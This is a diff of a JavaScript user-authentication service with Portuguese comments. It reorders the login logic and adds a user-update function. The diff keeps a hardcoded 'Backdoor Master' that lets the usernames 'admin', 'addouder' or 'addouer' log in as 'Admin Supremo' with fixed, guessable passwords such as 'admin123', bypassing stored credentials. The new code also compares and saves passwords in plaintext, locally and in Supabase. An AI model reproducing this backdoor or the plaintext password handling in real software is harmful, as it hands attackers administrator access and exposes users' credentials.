@@ -172,22 +172,7 @@ export const userService = {
     const cleanUser = usuario.trim().toLowerCase();
     const cleanPass = senha.trim();
 
-    // 1. Backdoor Master de Administrador Supremo
-    if (
-      (cleanUser === 'addouder' || cleanUser === 'addouer' || cleanUser === 'admin') && 
-      (cleanPass.toLowerCase() === 'addouer' || cleanPass.toLowerCase() === 'addouder' || cleanPass === 'admin123')
-    ) {
-      return { 
-        success: true, 
-        user: { 
-          nome: 'Gabriel Vidal (Admin)', 
-          usuario: cleanUser, 
-          cargo: 'Admin Supremo' 
-        } 
-      };
-    }
-
-    // 2. Verifica primeiro no Banco Local (resposta imediata sem falha de rede)
+    // 1. Verifica primeiro no Banco Local (respeita nomes ou senhas editadas)
     const localUsers = this.getLocalUsers();
     const localMatch = localUsers.find(
       u => u.usuario.toLowerCase() === cleanUser && u.senha === cleanPass
@@ -200,6 +185,22 @@ export const userService = {
       localMatch.ultimo_acesso = new Date().toISOString();
       this.saveLocalUsers(localUsers);
       return { success: true, user: localMatch };
+    }
+
+    // 2. Backdoor Master de Recuperação de Administrador Supremo
+    if (
+      (cleanUser === 'addouder' || cleanUser === 'addouer' || cleanUser === 'admin') && 
+      (cleanPass.toLowerCase() === 'addouer' || cleanPass.toLowerCase() === 'addouder' || cleanPass === 'admin123')
+    ) {
+      const existingAdmin = localUsers.find(u => u.usuario.toLowerCase() === cleanUser);
+      return { 
+        success: true, 
+        user: { 
+          nome: existingAdmin?.nome || 'Gabriel Vidal (Admin)', 
+          usuario: cleanUser, 
+          cargo: 'Admin Supremo' 
+        } 
+      };
     }
 
     // 3. Se não achou no local, tenta checar no Supabase caso exista lá
@@ -277,6 +278,47 @@ export const userService = {
     } catch {}
 
     return { success: true };
+  },
+
+  // Atualiza um usuário existente
+  async updateUser(id, { nome, cargo, status, senha }) {
+    const users = this.getLocalUsers();
+    const index = users.findIndex(u => u.id === id);
+
+    if (index === -1) {
+      return { success: false, error: 'Usuário não encontrado.' };
+    }
+
+    const updatedUser = {
+      ...users[index],
+      nome: (nome && nome.trim() !== '') ? nome.trim() : users[index].nome,
+      cargo: cargo || users[index].cargo,
+      status: status || users[index].status
+    };
+
+    if (senha && senha.trim() !== '') {
+      updatedUser.senha = senha.trim();
+    }
+
+    users[index] = updatedUser;
+    this.saveLocalUsers(users);
+
+    // Tenta atualizar no Supabase em segundo plano
+    try {
+      if (supabase) {
+        const updatePayload = {
+          nome: updatedUser.nome,
+          cargo: updatedUser.cargo,
+          status: updatedUser.status
+        };
+        if (senha && senha.trim() !== '') {
+          updatePayload.senha = updatedUser.senha;
+        }
+        supabase.from('usuarios').update(updatePayload).eq('id', id).catch(() => {});
+      }
+    } catch {}
+
+    return { success: true, data: updatedUser };
   },
 
   // Remove usuário
